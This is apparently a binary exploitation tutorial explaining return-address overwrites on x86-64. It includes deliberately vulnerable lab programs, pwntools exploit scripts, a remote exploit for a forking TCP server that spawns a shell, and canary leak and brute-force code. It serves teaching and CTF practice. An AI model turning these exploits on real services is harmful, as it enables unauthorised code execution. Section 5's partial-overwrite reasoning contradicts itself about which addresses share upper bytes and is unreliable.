---
title: Return Address Overwrite Owning the Instruction Pointer
description: This article is about that mechanism in full. Not just *that* it works, but *why* it works at the CPU level, what the compiler and OS do to stop you, and how to systematically defeat every layer. We're going from `CALL`/`RET` mnemonics all the way to remote code execution on a hardened binary.
category: pwn
date: 2026-07-01
reading_time: 20
tags: [pwn, c]
slug: return-address-overwrite-owning-the-instruction-pointer
---

## Introduction



*by mrdevnull · binary exploitation series · part 2*

---

In part 1 we established the overflow primitive — write past a buffer, corrupt the stack. We used it to redirect execution, but we treated the return address as a black box: "overwrite it with the address you want." 

This article is about that mechanism in full. Not just *that* it works, but *why* it works at the CPU level, what the compiler and OS do to stop you, and how to systematically defeat every layer. We're going from `CALL`/`RET` mnemonics all the way to remote code execution on a hardened binary.

---

## 1. The CPU-Level Story: CALL and RET

Everything starts with two instructions.

When the CPU executes `CALL target`:

```
1. RSP  -= 8                  ; grow stack down by 8
2. [RSP] = RIP + len(CALL)    ; push next instruction's address
3. RIP  = target              ; jump to called function
```

The value pushed — the address of the instruction *after* the `CALL` — is the **return address**. It lives on the stack.

When the CPU executes `RET`:

```
1. RIP = [RSP]     ; pop 8 bytes from stack into instruction pointer
2. RSP += 8        ; shrink stack up
```

That's it. `RET` is just a `POP RIP`. There is no authentication, no validation, no check that the value is sane. The CPU pops whatever bytes are at `[RSP]` and jumps there unconditionally.

The attack surface is the 8 bytes at `[RSP]` at the moment `RET` executes. If you control those bytes, you control where the CPU goes next.

Let's trace it through the full call chain:

```
main() calls vuln()
        │
        ▼
CALL vuln         ; pushes addr of next main instruction → ret_addr on stack
─────────────────────────────────────────
PUSH RBP          ; save main's frame pointer (prologue)
MOV  RBP, RSP     ; set our frame pointer
SUB  RSP, 0x50    ; allocate locals (includes buf)
...
[buf lives here, at RBP-N]
...
LEAVE             ; epilogue: RSP = RBP, POP RBP
RET               ; POP RIP ← this is your target
```

The stack at the moment `RET` fires in `vuln()`:

```
┌────────────────────────────┐
│  ...main's frame...        │  ← high addresses
├────────────────────────────┤
│  ret_addr (8 bytes)        │  ← [RSP] at RET time — your target
├────────────────────────────┤
│  saved RBP (8 bytes)       │  ← overwritten second
├────────────────────────────┤  ← RBP during vuln()
│  local vars / buf          │  ← overwritten first
└────────────────────────────┘  ← RSP during vuln() body
```

Write far enough past `buf`, corrupt `saved RBP`, then corrupt `ret_addr`. When `RET` fires, you own `RIP`.

---

## 2. What You're Actually Writing

The return address is a 64-bit (8-byte) virtual address. On x86-64 Linux, the current canonical address space uses only **48 bits** — the upper 16 bits of any valid user-space address must be zero (addresses look like `0x00007fffffffe000`).

This matters for two reasons:

**Null bytes**: the high two bytes of any valid user-space address are `\x00\x00`. If the vulnerability uses `strcpy`, `gets`, or any function that stops at a null byte, you can still exploit it because the null bytes are at the **end** of the little-endian address. `p64(0x00007ffff7a52290)` = `\x90\x22\xa5\xf7\xff\x7f\x00\x00` — the nulls are last, so they'll only terminate the string after you've written the full address.

**Partial overwrites**: if you can only overflow by a small number of bytes, you might only be able to overwrite the **low bytes** of the return address. With no PIE, the binary is always mapped at a fixed low address (`0x400000`), so a 2-byte partial overwrite can redirect into the binary without knowing any libc addresses. This technique becomes critical when leaks are unavailable.

---

## 3. The LEAVE Instruction and SFP Corruption

Most articles say "overwrite 64 bytes of buffer + 8 bytes of saved RBP + 8 bytes of return address." But what *is* that saved RBP write doing?

`LEAVE` expands to:

```asm
MOV RSP, RBP   ; restore stack pointer from frame pointer
POP RBP        ; restore caller's RBP from [RSP]
```

If you corrupt saved RBP, when `LEAVE` executes:

1. `RSP = RBP` — fine, RSP is set from our (correct) RBP
2. `POP RBP` — pops your corrupted value into RBP

Then `RET` pops the return address. So at `RET` time, RBP contains your corrupted value.

This matters when you target the **caller**. After our `vuln()` returns to `main()`, main's RBP is now wrong. If main uses RBP to reference locals (`[rbp-0x10]`), those references now point at attacker-controlled memory. This is the basis of **frame pointer overwrite** exploits — a separate technique — but understanding it here prevents confusion about why your exploit corrupts memory you didn't intend to touch.

For clean return address overwrites: corrupt saved RBP with any 8 bytes, then put your target address. The corrupted RBP only matters if you need to chain into the caller's frame.

---

## 4. Lab 1 — Surgical Overwrite: Minimum Bytes

Most tutorials overflow with 200 bytes of `'A'`. Real exploits are surgical. Let's do it with exactly the minimum number of bytes.

```c
// lab_surgical.c
#include <stdio.h>
#include <string.h>

void backdoor(void) {
    puts("[!] backdoor executed");
    // simulate privileged action
    FILE *f = fopen("/etc/passwd", "r");
    if (f) {
        char line[128];
        fgets(line, sizeof(line), f);
        printf("first line: %s", line);
        fclose(f);
    }
}

void process(char *input) {
    char buf[48];
    strcpy(buf, input);   // no bounds check
}

int main(int argc, char **argv) {
    if (argc < 2) { puts("usage: ./lab <input>"); return 1; }
    process(argv[1]);
    return 0;
}
```

```bash
gcc -o lab_surgical lab_surgical.c -fno-stack-protector -no-pie
```

Note: `strcpy` stops at null bytes — so we cannot have `\x00` in the middle of our payload. But as established, the high bytes of the address are null and they come *last* in little-endian, so we're fine.

### Finding the Exact Layout

```bash
gdb ./lab_surgical
pwndbg> disass process
```

```
   0x0000000000401176 <+0>:   push   rbp
   0x0000000000401177 <+1>:   mov    rbp,rsp
   0x000000000040117a <+3>:   sub    rsp,0x40       ← 0x40 = 64 bytes allocated
   0x000000000040117e <+7>:   mov    QWORD PTR [rbp-0x38],rdi
   0x0000000000401182 <+11>:  mov    rdx,QWORD PTR [rbp-0x38]
   0x0000000000401186 <+15>:  lea    rax,[rbp-0x30]  ← buf is at rbp-0x30 (48 bytes from rbp)
   0x000000000040118a <+19>:  mov    rsi,rdx
   0x000000000040118d <+20>:  mov    rdi,rax
   0x0000000000401190 <+22>:  call   0x401060 <strcpy@plt>
   0x0000000000401195 <+27>:  nop
   0x0000000000401196 <+28>:  leave
   0x0000000000401197 <+29>:  ret
```

`buf` is at `rbp-0x30` = 48 bytes below RBP. Offset to return address:

```
48 (buf → RBP) + 8 (saved RBP) = 56 bytes
```

Confirm:

```bash
pwndbg> cyclic 100
pwndbg> run $(cyclic 100)
# crash: RSP contains 'iaaaaaaa' or similar
pwndbg> cyclic -l <crashed_value>
# → 56
```

```bash
python3 -c "
from pwn import *
elf = ELF('./lab_surgical')
backdoor = elf.sym['backdoor']
payload = b'A'*56 + p64(backdoor)
import sys
sys.stdout.buffer.write(payload)
" | xargs -0 ./lab_surgical
```

Or as a clean script:

```python
# exploit_surgical.py
from pwn import *
import subprocess

elf      = ELF('./lab_surgical')
offset   = 56
target   = elf.sym['backdoor']

payload  = b'A' * offset + p64(target)

# Pass as argv[1]
result = subprocess.run(
    ['./lab_surgical', payload],
    capture_output=True
)
print(result.stdout.decode())
```

---

## 5. Lab 2 — Partial Overwrite (1–2 bytes only)

Scenario: you can overflow by only **2 bytes** past the buffer end. Not enough to reach the return address fully. But with no PIE, the binary sits at `0x400000` — the low byte of any function in the binary is meaningful.

```c
// lab_partial.c
#include <stdio.h>

void secret(void) {
    puts("[*] you found the secret path");
}

void vuln(void) {
    char buf[32];
    read(0, buf, 34);   // exactly 2 bytes past buffer end
}

int main(void) {
    vuln();
    return 0;
}
```

```bash
gcc -o lab_partial lab_partial.c -fno-stack-protector -no-pie
```

The stack layout during `vuln()`:

```
[rbp-0x20]  buf[0..31]      (32 bytes)
[rbp+0x00]  saved RBP       (8 bytes)
[rbp+0x08]  return address  (8 bytes)
```

We can write only 34 bytes: 32 fill the buffer, 2 bytes overwrite the *bottom 2 bytes of saved RBP*. The return address is untouched.

Saved RBP corruption → when `main()` uses its (now corrupted) RBP after `vuln()` returns... but wait, can we do better?

Let me show the more interesting case: **partial return address overwrite when the overflow reaches it by 1–2 bytes**.

```c
// lab_partial2.c — overflow reaches ret addr by 2 bytes
void vuln(void) {
    char buf[32];
    read(0, buf, 42);  // 32 buf + 8 saved RBP + 2 bytes into ret addr
}
```

The return address in `main()` looks like `0x00007ffff7xxxxxx`. The low 2 bytes we can overwrite redirect within a 64KB window of `main`'s return. Since no PIE means the binary's text segment starts at `0x401000`, and `secret()` is also in the binary:

```python
# exploit_partial.py
from pwn import *

elf    = ELF('./lab_partial2')
p      = process('./lab_partial2')

secret = elf.sym['secret']
log.info(f"secret @ {hex(secret)}")

# Overwrite only the low 2 bytes of the return address
# Full return address is something like 0x00007ffff7de2xxx
# We overwrite with the low 2 bytes of secret()
low2 = p16(secret & 0xffff)

payload = b'A' * 40 + low2   # 32 buf + 8 saved rbp + 2 bytes

p.send(payload)
p.interactive()
```

This only works when `secret()` and the original return address share the same upper 6 bytes — guaranteed when both are in the same binary with no PIE.

---

## 6. Lab 3 — Overwriting on 32-bit vs 64-bit: The Calling Convention Difference

Return address overwrite works on both architectures, but the mechanics differ in one important way: **argument passing**.

On **x86 (32-bit)**, arguments are passed on the stack, *after* the return address:

```
[ESP+0x00]  return address
[ESP+0x04]  arg1
[ESP+0x08]  arg2
```

So to call `system("/bin/sh")` on 32-bit, your payload looks like:

```python
payload = b'A' * offset
payload += p32(system)       # return address → jump to system()
payload += p32(0xdeadbeef)   # system()'s fake return address (don't care)
payload += p32(bin_sh)       # system()'s first argument
```

On **x86-64**, arguments go in registers (`RDI`, `RSI`, `RDX`, ...). You need a ROP gadget to load them before calling `system()`. That's why the `pop rdi; ret` pattern from part 1 is necessary.

This distinction is the single biggest source of confusion when moving between 32-bit and 64-bit CTF challenges. Know which ABI you're targeting before building any payload.

```bash
# compile 32-bit
gcc -o lab32 lab.c -m32 -fno-stack-protector -no-pie -z execstack

# check
file lab32
# lab32: ELF 32-bit LSB executable
```

32-bit exploit for ret2win:

```python
from pwn import *

elf    = ELF('./lab32')
p      = process('./lab32')
offset = 76   # typically 4 bytes larger alignment on 32-bit

win = elf.sym['win']

payload = flat(
    b'A' * offset,
    p32(win)         # just the address, no gadget needed
)
p.sendlineafter(b'input: ', payload)
p.interactive()
```

32-bit ret2libc (argument on stack):

```python
payload = flat(
    b'A' * offset,
    p32(system),
    p32(0x41414141),   # return addr from system (crash is fine)
    p32(bin_sh),
)
```

---

## 7. Lab 4 — Network Service: Exploiting a Forking Server

Real binaries aren't run from the command line and piped to. They're network services. This lab shows how to attack a forking TCP server — and why forking servers are especially exploitable.

```c
// server.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void win(void) {
    // in real scenario: dup2 socket to stdin/stdout, then execve
    execl("/bin/sh", "sh", NULL);
}

void handle(int fd) {
    char buf[128];
    char greeting[] = "hello: ";
    write(fd, greeting, sizeof(greeting)-1);
    read(fd, buf, 256);   // overflow
    write(fd, "ok\n", 3);
}

int main(void) {
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(4444),
        .sin_addr.s_addr = INADDR_ANY
    };
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, 5);

    while (1) {
        int cli = accept(srv, NULL, NULL);
        if (fork() == 0) {
            close(srv);
            handle(cli);
            close(cli);
            exit(0);
        }
        close(cli);
    }
}
```

```bash
gcc -o server server.c -fno-stack-protector -no-pie
./server &
```

Why forking helps the attacker: **each child fork inherits the same address space layout as the parent**. If ASLR is on, the parent was randomized once at startup — but every child has the same addresses. If you can crash a child and try again, you're brute-forcing against the same fixed address space, not a freshly randomized one. On 32-bit this is devastating (only 16 bits of entropy). On 64-bit you typically need a leak.

```python
# exploit_server.py
from pwn import *

HOST = '127.0.0.1'
PORT = 4444

elf    = ELF('./server')
offset = 136   # 128 buf + 8 saved rbp

win    = elf.sym['win']
log.info(f"win @ {hex(win)}")

p = remote(HOST, PORT)

p.recvuntil(b'hello: ')

payload = flat(
    b'A' * offset,
    p64(win)
)

p.send(payload)
p.interactive()
```

For a real reverse shell over the network socket, `win()` needs to connect the socket fd to stdin/stdout/stderr first:

```c
void win(int fd) {
    dup2(fd, 0);   // stdin  → socket
    dup2(fd, 1);   // stdout → socket
    dup2(fd, 2);   // stderr → socket
    execl("/bin/sh", "sh", NULL);
}
```

In the ROP chain, you'd set `RDI = fd` (the socket file descriptor, typically 4 or 5 in a simple server) before calling `win`.

---

## 8. Hardening the Target: The Canary Problem

So far: no canary. Let's enable it and see exactly what happens.

```bash
gcc -o lab_canary lab.c -no-pie   # canary ON by default
```

Dissassemble the prologue:

```asm
push   rbp
mov    rbp, rsp
sub    rsp, 0x50
mov    rax, QWORD PTR fs:0x28    ← read canary from TLS (Thread Local Storage)
mov    QWORD PTR [rbp-0x8], rax  ← store canary just below saved RBP
xor    eax, eax
```

And the epilogue:

```asm
mov    rax, QWORD PTR [rbp-0x8]  ← load canary from stack
xor    rax, QWORD PTR fs:0x28    ← XOR with original value
je     <ok>                      ← if equal, continue
call   __stack_chk_fail          ← else: terminate
```

The canary sits between your buffer and the return address:

```
┌──────────────────────┐
│  return address      │
├──────────────────────┤
│  saved RBP           │
├──────────────────────┤
│  canary (8 bytes)    │  ← must survive intact
├──────────────────────┤
│  buf[]               │
└──────────────────────┘
```

A linear overflow from `buf` will trash the canary. The check fires, process dies. Three ways around it:

### Bypass 1: Leak the Canary First

If you have a **read primitive** (format string, out-of-bounds read, another `printf` before the overflow), you can read the canary value and include it correctly in your payload.

The canary on x86-64 always has a **null byte as its lowest byte** (the byte at the lowest address). This is intentional — it terminates C strings so `printf("%s")` can't leak it easily through string reads. But format string `%7$p` (direct parameter access) can still leak it as a pointer.

```python
# Hypothetical: leak via format string at offset 7 on the stack
p.sendline(b'%7$p')
canary = int(p.recvline().strip(), 16)
log.success(f"canary: {hex(canary)}")

# Now include it in overflow
payload = flat(
    b'A' * 56,
    p64(canary),       # correct canary value
    p64(0x4141414141414141),  # fake saved RBP
    p64(win),          # return address
)
```

### Bypass 2: Brute Force (32-bit forking servers)

On 32-bit, the canary is 4 bytes. The null byte is fixed, leaving 3 bytes = 16.7 million possibilities. On a **forking** server, the child inherits the parent's canary — same value every fork. You can brute force one byte at a time (256 tries per byte × 3 bytes = 768 maximum requests).

```python
canary = b'\x00'    # first byte is always null
for i in range(3):
    for byte in range(256):
        p = remote(HOST, PORT)
        probe = b'A' * 64 + canary + bytes([byte])
        p.send(probe)
        response = p.recv()
        if b'ok' in response:   # survived the canary check
            canary += bytes([byte])
            break
        p.close()

log.success(f"canary: {canary.hex()}")
```

### Bypass 3: Out-of-Bounds Read Before Overflow

Some binaries let you read memory before writing. If you can index an array backwards, or if a struct has both a pointer and a buffer, you can read the canary directly off the stack. Once you have it, the overflow proceeds with the canary intact.

---

## 9. Validating Your Exploit Primitives in GDB

The three checks before sending any payload to a real target:

**Check 1: Does RIP contain your value?**
```
pwndbg> run < <(python3 exploit.py)
# on crash:
pwndbg> p/x $rip
# should show your target address or 0x4141414141414141
```

**Check 2: Is the stack aligned?**
```
pwndbg> p $rsp % 16
# should be 0 when entering system() or any libc function using MOVAPS
```

**Check 3: Are your addresses correct?**
```
pwndbg> x/gx <address>      # read 8 bytes at an address
pwndbg> info sym <address>   # what symbol is at this address?
pwndbg> p system             # runtime address of system()
```

**Check 4: Canary value when debugging**
```
pwndbg> p/x *(long long*)($rbp-8)   # read canary off stack mid-function
```

---

## 10. The Offset Is Wrong: Systematic Diagnosis

You ran the exploit and got a segfault at the wrong address, or no redirect at all. Here's the decision tree:

```
Wrong address in RIP?
├── RIP shows part of your 'A' pattern
│   └── offset is too large, reduce it
├── RIP shows 0x0000414141414141 (partial overwrite)
│   └── offset is too small by a few bytes
├── RIP shows 0x00007f... (original return addr, unchanged)
│   └── overflow didn't reach return addr — increase input size
├── SIGILL or jump to unmapped memory
│   └── address is right, but it's a bad instruction at that addr
│       → check you're jumping to function START not middle
└── Process terminated cleanly (no crash)
    └── canary check fired before RET — you need the canary
```

Misalignment by 8 bytes is the most common mistake. The compiler may add padding between the declared buffer size and the actual `SUB RSP` in the prologue. Always verify with `disass <function>` in GDB, not just the C source.

```bash
# Source says buf[64] but compiler allocated:
pwndbg> disass vuln
# sub rsp, 0x60    ← 96 bytes allocated, not 64
# buf is at rbp-0x60, so offset = 0x60 + 8 = 104, not 72
```

This happens because the compiler aligns the frame to 16-byte boundaries and may add padding for local variable alignment.

---

## 11. Putting It All Together: The Mental Model

Return address overwrite is not a trick. It's a consequence of one architectural decision: `RET` is `POP RIP`, unconditionally. The entire mechanism:

```
Overflow past buf
    → corrupt saved RBP (collateral)
    → corrupt return address (target)
        → RET pops your value into RIP
            → CPU jumps to your address
                → you control execution
```

Everything else in exploitation is about:
1. **Finding** this primitive (what's the vulnerable input?)
2. **Measuring** it (what's the exact offset?)
3. **Populating** RIP with a useful address (win, gadget, libc function)
4. **Setting up** the environment that address expects (registers, stack state, arguments)

Steps 3 and 4 scale from trivial (jump to `win()`) to complex (20-gadget ROP chain leaking libc, pivoting stack, calling execve with a constructed argv). The primitive is always the same.
